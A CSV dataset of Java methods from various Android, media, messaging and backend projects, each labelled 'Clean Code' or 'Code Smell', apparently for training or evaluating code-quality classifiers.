text,label,text_label
"@Override public void clearSearch(){
  mSearchQuery=null;
  for (  VideoGroupObjectAdapter adapter : mSearchGroupAdapters.values()) {
    adapter.clear();
  }
  mSearchGroupAdapters.clear();
  ObjectAdapter resultsAdapter=getResultsAdapter();
  if (resultsAdapter == null) {
    return;
  }
  int size=resultsAdapter.size();
  int index=0;
  for (int i=0; i < size; i++) {
    Object row=resultsAdapter.get(index);
    if (row instanceof ListRow && ((ListRow)row).getAdapter() instanceof VideoGroupObjectAdapter) {
      detachAdapter(index);
    }
 else {
      index++;
    }
  }
}",0,Clean Code
"private static void validateNoCyclesStep(Set<ClassQName> alreadySeen,MethodInfo method,boolean includeHolder){
  Set<ClassQName> outgoing=new HashSet<>();
  if (includeHolder) {
    outgoing.add(new ClassQName(method.getDeclaringClass()));
  }
  for (  ParameterInfo ppi : method.getParameters()) {
    outgoing.add(new ClassQName(ppi.getType()));
  }
  if (outgoing.isEmpty()) {
    return;
  }
  Set<ClassQName> currentSeen=new HashSet<>();
  currentSeen.addAll(alreadySeen);
  for (  ClassQName ci : outgoing) {
    if (!currentSeen.add(ci)) {
      throw new GenerationException(""@"" + State.class.getSimpleName() + "" dependency cycle is detected: ""+ ci.ci.getQualifiedName()+ "" ""+ currentSeen,method);
    }
    Set<ClassQName> nextSeen=new HashSet<>();
    nextSeen.addAll(alreadySeen);
    nextSeen.add(ci);
    for (    MethodInfo mi : BenchmarkGeneratorUtils.getAllMethods(ci.ci)) {
      if (mi.getAnnotation(Setup.class) != null || mi.getAnnotation(TearDown.class) != null) {
        validateNoCyclesStep(nextSeen,mi,false);
      }
    }
  }
}
",1,Code Smell
"@Override @RequestMapping(value=""login"",method=RequestMethod.POST) public ResponseResult login(String username,String password,String code) throws Exception {
  AuthToken authToken=authService.login(username,password,clientId,clientSecret);
  UserBasicInfo userBasicInfo=AuthenticationInterceptor.parseJwt(authToken.getJwt_token());
  CfUser cfUser=cfUserService.getUserByUid(userBasicInfo.getId(),true);
  cfUser.setPassword(null);
  CfCarParkLinkUserQuery cfCarParkLinkUserQuery=new CfCarParkLinkUserQuery();
  cfCarParkLinkUserQuery.setUid(userBasicInfo.getId());
  List<CfCarParkLinkUser> cfCarParkLinkUsers=cfCarParkLinkUserService.getListByQuery(cfCarParkLinkUserQuery);
  if (cfCarParkLinkUsers != null && cfCarParkLinkUsers.size() > 0) {
    for (    CfCarParkLinkUser cfCarParkLinkUser : cfCarParkLinkUsers) {
      if (StringUtils.isNotEmpty(cfCarParkLinkUser.getCheckPointIds())) {
        CfCarParkCheckpointQuery cfCarParkCheckpointQuery=new CfCarParkCheckpointQuery();
        String[] checkPointIds=cfCarParkLinkUser.getCheckPointIds().split("","");
        cfCarParkCheckpointQuery.setIds(new ArrayList<>());
        for (int i=0; i < checkPointIds.length; i++) {
          cfCarParkCheckpointQuery.getIds().add(checkPointIds[i]);
        }
        List<CfCarParkCheckpoint> cfCarParkCheckpoints=cfCarParkCheckpointService.getListByQuery(cfCarParkCheckpointQuery);
        if (cfCarParkCheckpoints != null && cfCarParkCheckpoints.size() > 0) {
          cfCarParkCheckpointQuery.setIds(new ArrayList<>());
          for (          CfCarParkCheckpoint cfCarParkCheckpoint : cfCarParkCheckpoints) {
            cfCarParkCheckpointQuery.getIds().add(cfCarParkCheckpoint.getId());
          }
          cfCarParkCheckpointQuery.setDutyUid(null);
          CfCarParkCheckpoint cfCarParkCheckpoint=new CfCarParkCheckpoint();
          cfCarParkCheckpoint.setDutyUid(userBasicInfo.getId());
          cfCarParkCheckpointService.updateByQuery(cfCarParkCheckpoint,cfCarParkCheckpointQuery);
        }
      }
    }
    if (System.currentTimeMillis() - cfCarParkLinkUsers.get(0).getStartDutyTime() > 39600000) {
      CfCarParkLinkUser cfCarParkLinkUser=new CfCarParkLinkUser();
      cfCarParkLinkUser.setStartDutyTime(System.currentTimeMillis());
      cfCarParkLinkUserService.updateByQuery(cfCarParkLinkUser,cfCarParkLinkUserQuery);
    }
  }
  return new ResponseResult(CommonCode.SUCCESS,cfUser,authToken,0);
}",1,Code Smell
"private static ItemData.@Nullable Builder createItemData(JsonNode itemNode,Map<String,GeyserMappingItem> items,BlockMappings blockMappings,Map<String,ItemDefinition> definitions){
  int count=1;
  int damage=0;
  NbtMap tag=null;
  String identifier=itemNode.get(""id"").textValue();
  for (  BiPredicate<String,Integer> predicate : JAVA_ONLY_ITEM_FILTER) {
    if (predicate.test(identifier,damage)) {
      return null;
    }
  }
  if (!items.containsKey(identifier) && !identifier.equals(""minecraft:lodestone_compass"")) {
    boolean found=false;
    for (    var mapping : items.values()) {
      if (mapping.getBedrockIdentifier().equals(identifier)) {
        found=true;
        break;
      }
    }
    if (!found) {
      return null;
    }
  }
  JsonNode damageNode=itemNode.get(""damage"");
  if (damageNode != null) {
    damage=damageNode.asInt();
  }
  JsonNode countNode=itemNode.get(""count"");
  if (countNode != null) {
    count=countNode.asInt();
  }
  GeyserBedrockBlock blockDefinition=null;
  JsonNode blockStateNode;
  if ((blockStateNode=itemNode.get(""block_state_b64"")) != null) {
    byte[] bytes=Base64.getDecoder().decode(blockStateNode.asText());
    ByteArrayInputStream bais=new ByteArrayInputStream(bytes);
    try {
      NbtMap stateTag=(NbtMap)NbtUtils.createReaderLE(bais).readTag();
      NbtMapBuilder builder=stateTag.toBuilder();
      builder.remove(""name_hash"");
      builder.remove(""network_id"");
      builder.remove(""version"");
      builder.remove(""block_id"");
      blockDefinition=blockMappings.getDefinition(builder.build());
    }
 catch (    IOException e) {
      e.printStackTrace();
    }
  }
  JsonNode nbtNode=itemNode.get(""nbt_b64"");
  if (nbtNode != null) {
    byte[] bytes=Base64.getDecoder().decode(nbtNode.asText());
    ByteArrayInputStream bais=new ByteArrayInputStream(bytes);
    try {
      tag=(NbtMap)NbtUtils.createReaderLE(bais).readTag();
    }
 catch (    IOException e) {
      e.printStackTrace();
    }
  }
  ItemDefinition definition=definitions.get(identifier);
  if (definition == null) {
    GeyserImpl.getInstance().getLogger().debug(""Unknown item definition with identifier "" + identifier + "" when loading creative items!"");
    return null;
  }
  return ItemData.builder().definition(definition).damage(damage).count(count).tag(tag).blockDefinition(blockDefinition);
}",1,Code Smell
"public boolean takePicture(final File path,final CameraSession session,final Runnable callback){
  if (session == null) {
    return false;
  }
  final CameraInfo info=session.cameraInfo;
  final boolean flipFront=session.isFlipFront();
  Camera camera=info.camera;
  try {
    camera.takePicture(null,null,(data,camera1) -> {
      Bitmap bitmap=null;
      int size=(int)(AndroidUtilities.getPhotoSize() / AndroidUtilities.density);
      String key=String.format(Locale.US,""%s@%d_%d"",Utilities.MD5(path.getAbsolutePath()),size,size);
      try {
        BitmapFactory.Options options=new BitmapFactory.Options();
        options.inJustDecodeBounds=true;
        BitmapFactory.decodeByteArray(data,0,data.length,options);
        options.inJustDecodeBounds=false;
        options.inPurgeable=true;
        bitmap=BitmapFactory.decodeByteArray(data,0,data.length,options);
      }
 catch (      Throwable e) {
        FileLog.e(e);
      }
      try {
        if (info.frontCamera != 0 && flipFront) {
          try {
            Matrix matrix=new Matrix();
            matrix.setRotate(getOrientation(data));
            matrix.postScale(-1,1);
            Bitmap scaled=Bitmaps.createBitmap(bitmap,0,0,bitmap.getWidth(),bitmap.getHeight(),matrix,true);
            if (scaled != bitmap) {
              bitmap.recycle();
            }
            FileOutputStream outputStream=new FileOutputStream(path);
            scaled.compress(Bitmap.CompressFormat.JPEG,80,outputStream);
            outputStream.flush();
            outputStream.getFD().sync();
            outputStream.close();
            if (scaled != null) {
              ImageLoader.getInstance().putImageToCache(new BitmapDrawable(scaled),key,false);
            }
            if (callback != null) {
              callback.run();
            }
            return;
          }
 catch (          Throwable e) {
            FileLog.e(e);
          }
        }
        FileOutputStream outputStream=new FileOutputStream(path);
        outputStream.write(data);
        outputStream.flush();
        outputStream.getFD().sync();
        outputStream.close();
        if (bitmap != null) {
          ImageLoader.getInstance().putImageToCache(new BitmapDrawable(bitmap),key,false);
        }
      }
 catch (      Exception e) {
        FileLog.e(e);
      }
      if (callback != null) {
        callback.run();
      }
    }
);
    return true;
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
  return false;
}",1,Code Smell
"private void processCurrentPacket(){
  if (currentDtvCcPacket.currentIndex != (currentDtvCcPacket.packetSize * 2 - 1)) {
    Log.w(TAG,""DtvCcPacket ended prematurely; size is "" + (currentDtvCcPacket.packetSize * 2 - 1) + "", but current index is ""+ currentDtvCcPacket.currentIndex+ "" (sequence number ""+ currentDtvCcPacket.sequenceNumber+ ""); ignoring packet"");
    return;
  }
  serviceBlockPacket.reset(currentDtvCcPacket.packetData,currentDtvCcPacket.currentIndex);
  int serviceNumber=serviceBlockPacket.readBits(3);
  int blockSize=serviceBlockPacket.readBits(5);
  if (serviceNumber == 7) {
    serviceBlockPacket.skipBits(2);
    serviceNumber=serviceBlockPacket.readBits(6);
    if (serviceNumber < 7) {
      Log.w(TAG,""Invalid extended service number: "" + serviceNumber);
    }
  }
  if (blockSize == 0) {
    if (serviceNumber != 0) {
      Log.w(TAG,""serviceNumber is non-zero ("" + serviceNumber + "") when blockSize is 0"");
    }
    return;
  }
  if (serviceNumber != selectedServiceNumber) {
    return;
  }
  boolean cuesNeedUpdate=false;
  while (serviceBlockPacket.bitsLeft() > 0) {
    int command=serviceBlockPacket.readBits(8);
    if (command != COMMAND_EXT1) {
      if (command <= GROUP_C0_END) {
        handleC0Command(command);
      }
 else       if (command <= GROUP_G0_END) {
        handleG0Character(command);
        cuesNeedUpdate=true;
      }
 else       if (command <= GROUP_C1_END) {
        handleC1Command(command);
        cuesNeedUpdate=true;
      }
 else       if (command <= GROUP_G1_END) {
        handleG1Character(command);
        cuesNeedUpdate=true;
      }
 else {
        Log.w(TAG,""Invalid base command: "" + command);
      }
    }
 else {
      command=serviceBlockPacket.readBits(8);
      if (command <= GROUP_C2_END) {
        handleC2Command(command);
      }
 else       if (command <= GROUP_G2_END) {
        handleG2Character(command);
        cuesNeedUpdate=true;
      }
 else       if (command <= GROUP_C3_END) {
        handleC3Command(command);
      }
 else       if (command <= GROUP_G3_END) {
        handleG3Character(command);
        cuesNeedUpdate=true;
      }
 else {
        Log.w(TAG,""Invalid extended command: "" + command);
      }
    }
  }
  if (cuesNeedUpdate) {
    cues=getDisplayCues();
  }
}",0,Clean Code
"@Test public void testEvaluateQueueSizeRetainMoreThanMinimumDurationAfterDiscard(){
  Format format1=videoFormat(500,320,240);
  Format format2=videoFormat(1000,640,480);
  Format format3=videoFormat(2000,960,720);
  TrackGroup trackGroup=new TrackGroup(format1,format2,format3);
  FakeMediaChunk chunk1=new FakeMediaChunk(format1,0,10_000_000);
  FakeMediaChunk chunk2=new FakeMediaChunk(format1,10_000_000,20_000_000);
  FakeMediaChunk chunk3=new FakeMediaChunk(format1,20_000_000,30_000_000);
  List<FakeMediaChunk> queue=new ArrayList<>();
  queue.add(chunk1);
  queue.add(chunk2);
  queue.add(chunk3);
  when(mockBandwidthMeter.getBitrateEstimate()).thenReturn(500L);
  adaptiveTrackSelection=adaptiveTrackSelectionWithMinTimeBetweenBufferReevaluationMs(trackGroup,15_000,2000);
  int initialQueueSize=adaptiveTrackSelection.evaluateQueueSize(0,queue);
  assertThat(initialQueueSize).isEqualTo(3);
  fakeClock.advanceTime(2000);
  when(mockBandwidthMeter.getBitrateEstimate()).thenReturn(1000L);
  int newSize=adaptiveTrackSelection.evaluateQueueSize(0,queue);
  assertThat(newSize).isEqualTo(2);
}",0,Clean Code
"/** 
 * update subclass field values
 * @return if changed
 */
public boolean updModifyInfo(long dataVerId,int topicNameId,int brokerPort,String brokerIp,TopicStatus deployStatus,TopicPropGroup topicProps){
  boolean changed=false;
  if (dataVerId != TBaseConstants.META_VALUE_UNDEFINED && this.getDataVerId() != dataVerId) {
    changed=true;
    this.setDataVersionId(dataVerId);
  }
  if (topicNameId != TBaseConstants.META_VALUE_UNDEFINED && this.topicNameId != topicNameId) {
    changed=true;
    this.topicNameId=topicNameId;
  }
  if (brokerPort != TBaseConstants.META_VALUE_UNDEFINED && this.brokerPort != brokerPort) {
    changed=true;
    this.brokerPort=brokerPort;
  }
  if (TStringUtils.isNotBlank(brokerIp) && !this.brokerIp.equals(brokerIp)) {
    changed=true;
    this.brokerIp=brokerIp;
  }
  if (deployStatus != null && deployStatus != TopicStatus.STATUS_TOPIC_UNDEFINED && this.deployStatus != deployStatus) {
    changed=true;
    this.deployStatus=deployStatus;
  }
  if (topicProps != null && !topicProps.isDataEquals(this.topicProps)) {
    if (this.topicProps.updModifyInfo(topicProps)) {
      changed=true;
    }
  }
  if (changed) {
    this.brokerAddress=KeyBuilderUtils.buildAddressInfo(this.brokerIp,this.brokerPort);
    updSerialId();
  }
  return changed;
}
",0,Clean Code
"private void openAddMember(){
  Bundle args=new Bundle();
  args.putBoolean(""addToGroup"",true);
  args.putLong(""chatId"",currentChat.id);
  GroupCreateActivity fragment=new GroupCreateActivity(args);
  fragment.setInfo(chatInfo);
  if (chatInfo != null && chatInfo.participants != null) {
    LongSparseArray<TLObject> users=new LongSparseArray<>();
    for (int a=0; a < chatInfo.participants.participants.size(); a++) {
      users.put(chatInfo.participants.participants.get(a).user_id,null);
    }
    fragment.setIgnoreUsers(users);
  }
  fragment.setDelegate((users,fwdCount) -> {
    HashSet<Long> currentParticipants=new HashSet<>();
    ArrayList<TLRPC.User> addedUsers=new ArrayList<>();
    if (chatInfo.participants.participants != null) {
      for (int i=0; i < chatInfo.participants.participants.size(); i++) {
        currentParticipants.add(chatInfo.participants.participants.get(i).user_id);
      }
    }
    getMessagesController().addUsersToChat(currentChat,ProfileActivity.this,users,fwdCount,user -> {
      addedUsers.add(user);
    }
,restrictedUser -> {
      for (int i=0; i < chatInfo.participants.participants.size(); i++) {
        if (chatInfo.participants.participants.get(i).user_id == restrictedUser.id) {
          chatInfo.participants.participants.remove(i);
          updateListAnimated(true);
          break;
        }
      }
    }
,() -> {
      int N=addedUsers.size();
      int[] finished=new int[1];
      for (int a=0; a < N; a++) {
        TLRPC.User user=addedUsers.get(a);
        if (!currentParticipants.contains(user.id)) {
          if (chatInfo.participants == null) {
            chatInfo.participants=new TLRPC.TL_chatParticipants();
          }
          if (ChatObject.isChannel(currentChat)) {
            TLRPC.TL_chatChannelParticipant channelParticipant1=new TLRPC.TL_chatChannelParticipant();
            channelParticipant1.channelParticipant=new TLRPC.TL_channelParticipant();
            channelParticipant1.channelParticipant.inviter_id=getUserConfig().getClientUserId();
            channelParticipant1.channelParticipant.peer=new TLRPC.TL_peerUser();
            channelParticipant1.channelParticipant.peer.user_id=user.id;
            channelParticipant1.channelParticipant.date=getConnectionsManager().getCurrentTime();
            channelParticipant1.user_id=user.id;
            chatInfo.participants.participants.add(channelParticipant1);
          }
 else {
            TLRPC.ChatParticipant participant=new TLRPC.TL_chatParticipant();
            participant.user_id=user.id;
            participant.inviter_id=getAccountInstance().getUserConfig().clientUserId;
            chatInfo.participants.participants.add(participant);
          }
          chatInfo.participants_count++;
          getMessagesController().putUser(user,false);
        }
      }
      updateListAnimated(true);
    }
);
  }
);
  presentFragment(fragment);
}",1,Code Smell
"/** 
 * Generate shard array
 * @param sheetInfoList A list sheet metadata.
 * @param batchSize Size of a split.
 * @param skipNums Number of rows to skip.
 * @return An array of splits.
 */
private static InputSplit[] calculateLarkSheetInputSplits(List<SheetInfo> sheetInfoList,int batchSize,List<Integer> skipNums){
  int splitCount=0;
  if (skipNums.isEmpty()) {
    splitCount=sheetInfoList.stream().mapToInt(sheetInfo -> (int)Math.ceil((double)(sheetInfo.getSheetMeta().getRowCount() - 1) / (double)batchSize)).sum();
  }
 else {
    for (int i=0; i < sheetInfoList.size(); i++) {
      SheetInfo sheetInfo=sheetInfoList.get(i);
      int skipNum=0;
      if (skipNums.size() > i) {
        skipNum=Math.max(skipNums.get(i),0);
      }
      splitCount+=(int)Math.ceil((double)Math.max(sheetInfo.getSheetMeta().getRowCount() - 1 - skipNum,0) / (double)batchSize);
    }
  }
  InputSplit[] larkSheetInputSplits=new LarkSheetInputSplit[splitCount];
  splitCount=0;
  for (int i=0; i < sheetInfoList.size(); i++) {
    SheetInfo sheetInfo=sheetInfoList.get(i);
    SheetMeta sheetMeta=sheetInfo.getSheetMeta();
    String sheetToken=sheetInfo.getSheetToken();
    int curCount=0;
    int skipNum=0;
    if (skipNums.isEmpty()) {
      curCount=(int)Math.ceil((double)(sheetMeta.getRowCount() - 1) / (double)batchSize);
    }
 else {
      if (skipNums.size() > i) {
        skipNum=Math.max(skipNums.get(i),0);
      }
      curCount=(int)Math.ceil((double)Math.max(sheetInfo.getSheetMeta().getRowCount() - 1 - skipNum,0) / (double)batchSize);
    }
    for (int j=0; j < curCount; j++) {
      int startRowNumber=2 + j * batchSize + skipNum;
      int endRowNumber=startRowNumber + batchSize - 1;
      larkSheetInputSplits[splitCount]=new LarkSheetInputSplit(sheetMeta,sheetToken,sheetMeta.getSheetId(),startRowNumber,endRowNumber);
      splitCount+=1;
    }
  }
  return larkSheetInputSplits;
}",1,Code Smell
